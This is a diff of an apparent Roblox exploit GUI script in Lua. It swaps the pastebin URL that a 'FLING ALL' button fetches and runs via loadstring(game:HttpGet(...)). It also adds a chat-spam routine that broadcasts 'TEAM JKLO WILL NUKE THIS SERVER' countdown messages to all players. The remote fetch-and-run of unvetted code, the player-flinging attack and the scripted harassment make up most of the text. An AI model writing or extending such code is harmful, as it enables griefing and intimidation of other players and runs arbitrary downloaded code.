@@ -59,13 +59,13 @@ FLINGALL.Rotation = 25
 FLINGALL.Position = UDim2.new(1.05, 0, 0.15, 0)
 FLINGALL.Size = UDim2.new(0, 100, 0, 25)
 FLINGALL.Font = Enum.Font.SourceSans
-FLINGALL.Text = "NUKE"
+FLINGALL.Text = "FLING ALL"
 FLINGALL.TextColor3 = Color3.fromRGB(0, 0, 0)
 FLINGALL.TextScaled = true
 FLINGALL.TextSize = 14.000
 FLINGALL.TextWrapped = true
 FLINGALL.MouseButton1Down:connect(function()
-loadstring(game:HttpGet("https://pastebin.com/raw/b44HwAM6"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/0LLBHBq4"))()
 end)
 SpamCHAT.Parent = Frame
 SpamCHAT.BackgroundColor3 = Color3.fromRGB(226, 155, 64)
@@ -104,13 +104,28 @@ SpamTEXT.Rotation = -25
 SpamTEXT.Position = UDim2.new(-0.40, 0, 0.15, 0)
 SpamTEXT.Size = UDim2.new(0, 100, 0, 25)
 SpamTEXT.Font = Enum.Font.SourceSans
-SpamTEXT.Text = "SpamTEXT"
+SpamTEXT.Text = "NukeChat"
 SpamTEXT.TextColor3 = Color3.fromRGB(0, 0, 0)
 SpamTEXT.TextScaled = true
 SpamTEXT.TextSize = 14.000
 SpamTEXT.TextWrapped = true
 SpamCHAT.MouseButton1Down:connect(function()
-local MESSAGE = "" ..TextBox.Text
+local MESSAGE = "TEAM JKLO WILL NUKE THIS SERVER IN 3 SEC"
+local E = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(MESSAGE, E)
+wait(1)
+local MESSAGE = "TEAM JKLO WILL NUKE THIS SERVER IN 2 SEC"
+local E = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(MESSAGE, E)
+wait(2)
+local MESSAGE = "TEAM JKLO WILL NUKE THIS SERVER IN 1 SEC"
+local E = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(MESSAGE, E)
+wait(1)
+local MESSAGE = "0 SEC LEFT!?!?"
 local E = "All"
 local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
 Event:FireServer(MESSAGE, E)
